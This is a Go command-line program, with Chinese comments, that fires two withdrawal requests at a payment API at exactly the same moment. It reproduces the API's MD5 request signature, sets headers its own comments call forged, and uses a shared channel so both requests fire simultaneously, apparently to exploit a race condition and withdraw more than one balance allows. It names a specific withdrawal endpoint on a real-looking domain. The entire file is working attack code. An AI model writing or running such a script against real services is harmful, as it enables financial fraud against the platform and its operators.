package main

import (
	"bytes"
	"crypto/md5"
	"encoding/hex"
	"encoding/json"
	"flag"
	"fmt"
	"io/ioutil"
	"net/http"
	"sort"
	"strings"
	"sync"
	"time"
)

// 过滤和排序、计算签名
func signPayload(data map[string]interface{}, secret string) map[string]interface{} {
	// 添加 timestamp 和 random
	now := time.Now()
	data["timestamp"] = now.Unix()
	if _, ok := data["random"]; !ok {
		data["random"] = now.UnixNano() / 1e6
	}
	if _, ok := data["language"]; !ok {
		data["language"] = "en"
	}

	// 过滤
	exclude := map[string]bool{"signature": true, "timestamp": true, "track": true}
	filtered := make(map[string]interface{})
	var keys []string

	for k, v := range data {
		if exclude[k] {
			continue
		}
		if v == nil {
			continue
		}
		// 忽略空字符串
		if s, ok := v.(string); ok && s == "" {
			continue
		}
		filtered[k] = v
		keys = append(keys, k)
	}

	// 排序
	sort.Strings(keys)

	// 构建 JSON 用于签名（注意 Go 的 JSON 序列化行为，确保和 JS 一致，不用 html escape）
	// Go 的 json.Marshal 会将 < > 等转义为 \u003c，这里需要避免
	sortedMap := make(map[string]interface{})
	for _, k := range keys {
		sortedMap[k] = filtered[k]
	}

	buffer := &bytes.Buffer{}
	encoder := json.NewEncoder(buffer)
	encoder.SetEscapeHTML(false)
	encoder.Encode(sortedMap)
	
	jsonStr := strings.TrimSpace(buffer.String())
	
	// 计算 MD5
	fullString := jsonStr + secret
	hash := md5.Sum([]byte(fullString))
	signature := strings.ToUpper(hex.EncodeToString(hash[:]))

	data["signature"] = signature
	return data
}

func doRequest(url string, token string, payload map[string]interface{}, wg *sync.WaitGroup, startLine chan bool, resultChan chan<- string, id string) {
	defer wg.Done()
	
	// 签名
	signedData := signPayload(payload, "")
	bodyBytes, _ := json.Marshal(signedData)
	req, _ := http.NewRequest("POST", url, bytes.NewBuffer(bodyBytes))
	req.Header.Set("Content-Type", "application/json")
	if token != "" {
		req.Header.Set("Authorization", "Bearer "+token)
	}
	// 伪造 Domainurl 和 Referrer
	req.Header.Set("Domainurl", url)
	req.Header.Set("Referrer", url)

	client := &http.Client{
		Timeout: 10 * time.Second,
	}

	// 等待发令枪响
	<-startLine

	resp, err := client.Do(req)
	if err != nil {
		resultChan <- fmt.Sprintf("[%s] 请求失败: %v", id, err)
		return
	}
	defer resp.Body.Close()
	respBody, _ := ioutil.ReadAll(resp.Body)
	
	resultChan <- fmt.Sprintf("[%s] 状态码: %d, 响应: %s", id, resp.StatusCode, string(respBody))
}

func main() {
	url := flag.String("url", "", "提现接口 URL (例如 https://arplatsaassit4.club/api/Withdraw/WithdrawApply)")
	token := flag.String("token", "", "用户 Token")
	
	amt1 := flag.Float64("amt1", 500, "VU1 提现金额")
	wallet1 := flag.String("wallet1", "", "VU1 钱包 ID")
	cat1 := flag.Int("cat1", 0, "VU1 通道 Category ID")
	type1 := flag.String("type1", "BankCard", "VU1 通道类型")

	amt2 := flag.Float64("amt2", 300, "VU2 提现金额")
	wallet2 := flag.String("wallet2", "", "VU2 钱包 ID")
	cat2 := flag.Int("cat2", 0, "VU2 通道 Category ID")
	type2 := flag.String("type2", "EWallet", "VU2 通道类型")
	
	flag.Parse()

	if *url == "" || *token == "" || *wallet1 == "" || *wallet2 == "" {
		fmt.Println("请提供必填参数: -url, -token, -wallet1, -wallet2")
		return
	}

	payload1 := map[string]interface{}{
		"amount":             *amt1,
		"walletId":           *wallet1,
		"withdrawCategoryId": *cat1,
		"withdrawType":       *type1,
		"withdrawPassword":   "123456",
	}

	payload2 := map[string]interface{}{
		"amount":             *amt2,
		"walletId":           *wallet2,
		"withdrawCategoryId": *cat2,
		"withdrawType":       *type2,
		"withdrawPassword":   "123456",
	}

	fmt.Println("========== Golang 极限并发提现测试 ==========")
	fmt.Printf("VU1: 通道=%s, 金额=%.2f\n", *type1, *amt1)
	fmt.Printf("VU2: 通道=%s, 金额=%.2f\n", *type2, *amt2)
	
	var wg sync.WaitGroup
	startLine := make(chan bool)
	resultChan := make(chan string, 2)

	wg.Add(2)
	
	go doRequest(*url, *token, payload1, &wg, startLine, resultChan, "VU1")
	go doRequest(*url, *token, payload2, &wg, startLine, resultChan, "VU2")

	// 休眠一小会儿让 goroutine 全部就绪阻塞在 startLine 上
	time.Sleep(500 * time.Millisecond)
	
	fmt.Println("⚡ 发令枪响，极限并发请求发射！")
	// 广播发令枪
	close(startLine)

	// 等待执行结束
	wg.Wait()
	close(resultChan)

	fmt.Println("\n========== 测试结果 ==========")
	for res := range resultChan {
		fmt.Println(res)
	}
	fmt.Println("==============================")
}
